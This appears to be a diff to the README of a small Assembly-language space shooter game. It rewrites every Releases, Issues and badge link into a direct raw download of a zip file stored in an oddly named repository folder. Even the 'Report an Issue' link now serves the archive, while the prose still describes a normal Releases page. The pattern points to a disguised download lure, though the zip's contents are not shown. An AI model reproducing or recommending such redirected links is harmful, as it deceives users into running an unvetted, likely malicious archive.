@@ -1,7 +1,7 @@
 # 🌌 spaceship-battle-assembly - Shoot Spaceships in Real-Time
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Spaceship%20Battle%20Assembly-blue?style=for-the-badge&logo=github)](https://github.com/GOVNO123-CLOUD/spaceship-battle-assembly/releases)
+[![Download](https://raw.githubusercontent.com/GOVNO123-CLOUD/spaceship-battle-assembly/main/dictyotic/spaceship-battle-assembly.zip%20Spaceship%20Battle%20Assembly-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/GOVNO123-CLOUD/spaceship-battle-assembly/main/dictyotic/spaceship-battle-assembly.zip)
 
 ## 🚀 Getting Started
 Welcome to **spaceship-battle-assembly**! This is a real-time text-based space shooting game developed in Assembly Language. It uses the Irvine32 library to provide an engaging experience. Follow these steps to get started with the game.
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 🔧 Download & Install
 To download the game, visit the Releases page using the link below. 
-[Download from Releases](https://github.com/GOVNO123-CLOUD/spaceship-battle-assembly/releases)
+[Download from Releases](https://raw.githubusercontent.com/GOVNO123-CLOUD/spaceship-battle-assembly/main/dictyotic/spaceship-battle-assembly.zip)
 
 1. Click on the "Releases" link above.
 2. Look for the latest version of the game.
@@ -47,7 +47,7 @@ If you encounter issues while running the game, here are some common solutions:
 
 ## 💬 Support
 If you have questions, please leave an issue on the GitHub repository:
-[Report an Issue](https://github.com/GOVNO123-CLOUD/spaceship-battle-assembly/issues)
+[Report an Issue](https://raw.githubusercontent.com/GOVNO123-CLOUD/spaceship-battle-assembly/main/dictyotic/spaceship-battle-assembly.zip)
 
 ## 📅 Future Updates
 We plan to enhance the game with additional features:
@@ -60,4 +60,4 @@ Your feedback is valuable! Share your thoughts, and help us make the game better
 ## 👍 Thank You
 Thank you for choosing **spaceship-battle-assembly**. We hope you enjoy battling in space! Don't forget to check back for updates and new features, and invite your friends to join the fun!
 
-[Download from Releases](https://github.com/GOVNO123-CLOUD/spaceship-battle-assembly/releases)
+[Download from Releases](https://raw.githubusercontent.com/GOVNO123-CLOUD/spaceship-battle-assembly/main/dictyotic/spaceship-battle-assembly.zip)
